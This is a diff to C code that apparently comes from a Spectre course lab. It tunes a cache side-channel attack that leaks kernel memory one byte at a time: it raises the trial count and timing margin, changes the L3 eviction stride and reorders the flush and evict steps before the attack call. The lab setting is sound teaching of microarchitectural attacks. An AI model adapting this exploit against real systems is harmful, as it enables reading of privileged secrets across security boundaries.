@@ -12,11 +12,12 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define STEP_SIZE 4096 
 #define THRESHOLD_SAMPLES 1000
-#define THRESHOLD_MARGIN 50
+#define THRESHOLD_MARGIN 100
 #define PAGE_SIZE 4096
 #define NUM_SLOTS 256
-#define TRIALS 40 
+#define TRIALS 70 
 #define TRAIN_PER_ATTACK 20 
 #define EVICT_SIZE (11 * 1024 * 1024)
 
@@ -93,7 +94,7 @@ static void flush_probe_array(uint8_t *base) {
 static void evict_cache() {
     // Forcibly evicts the L3 cache by accessing evict_buf.
     for (int a = 0; a < 4; a++) {
-        for (size_t i = 0; i < EVICT_SIZE; i += 4096) {
+        for (size_t i = 0; i < EVICT_SIZE; i += STEP_SIZE) {
             evict_buf[i] ^= 1;
         }
     }
@@ -116,6 +117,7 @@ static int reload_and_find_hit(char *shared_memory, uint64_t thresh) {
             best_index = idx;
         }
     }
+//    printf("Best index with threshold %ld, is %d", thresh, best_index);
     return best_index;
 }
 
@@ -136,16 +138,12 @@ static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset
 	call_kernel_part3(kernel_fd, shared_memory, 0);
 	call_kernel_part3(kernel_fd, shared_memory, 0);
 
-    flush_probe_array(shared_memory);
-    _mm_mfence();
+        flush_probe_array(shared_memory);
+        _mm_mfence();
 
 	// Evict 
 	evict_cache();
 
-/*	// Flush
-	flush_probe_array(shared_memory);
-	_mm_mfence();
-*/
 	// Attack
     	call_kernel_part3(kernel_fd, shared_memory, offset);
 
